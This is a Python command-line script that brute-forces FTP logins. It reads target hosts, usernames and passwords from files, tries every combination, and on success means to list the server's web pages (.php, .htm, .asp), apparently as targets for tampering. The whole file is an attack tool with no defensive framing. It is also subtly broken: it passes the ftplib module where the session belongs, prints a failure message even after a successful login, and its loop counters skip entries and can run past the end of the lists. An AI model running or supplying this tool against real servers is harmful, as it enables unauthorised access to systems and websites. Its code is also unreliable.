import optparse
import ftplib
from threading import *

def returnDefault(ftp):
	try:
		dirList = ftp.nlst()
	except:
		dirList = []
		print('[-] Could not List any sites')
		return
	retList = []
	for filename in dirList:
		fn = filename.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print("[+] Default page found: "+fn)
			retList.append(fn)
	return retList
def bruteFtp(hostname,username,password):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login(username,password)
		print('[+] Logedin: '+username+' | '+password)
		returnDefault(ftplib)
		ftp.quit()
	except Exception as e:
		pass
	print('[-] No luck with: '+username+':'+password+'@'+hostname)
	return(None,None)

def main():
	parser = optparse.OptionParser('usage%prog'+' -H <target hosts file> -u <ftp user file> -p <ftp password file>')
	parser.add_option('-H', dest='hfile', type='string', help='Specify the target host')
	parser.add_option('-u', dest='ufile', type='string', help='Specify the ftp list file')
	parser.add_option('-p', dest='pfile', type='string', help='Specify the password file')
	(options,args) = parser.parse_args()

	hfile = options.hfile
	ufile = options.ufile
	pfile = options.pfile
	hf = open(hfile,'r')
	uf = open(ufile,'r')
	pf = open(pfile, 'r')
	hostCounter = 0
	hostCounterMax = 0
	userCounter = 0
	userCounterMax = 0
	pwCounter = 0
	pwCounterMax = 0
	h = []
	pw = []
	un = []
	for hline in hf:
		h.append(hline.strip('\r').strip('\n'))
		hostCounterMax += 1
	for uline in uf:
		un.append(uline.strip('\r').strip('\n'))
		userCounterMax = userCounterMax + 1
	for pline in pf:
			pw.append(pline.strip('\r').strip('\n'))
			pwCounterMax = pwCounterMax + 1
	while hostCounter <= hostCounterMax and userCounter <= userCounterMax and pwCounter < pwCounterMax:
		#t = Thread(target=bruteFtp, args=(hostname,username,pw[i]))
		#t.start()
		bruteFtp(h[hostCounter],un[userCounter],pw[pwCounter])
		pwCounter += 1
		if pwCounter == pwCounterMax-1:
			pwCounter = 0
			if userCounter == userCounterMax-1:
				userCounter = 0
				hostCounter += 1
			userCounter += 1
if __name__ == '__main__':
	main()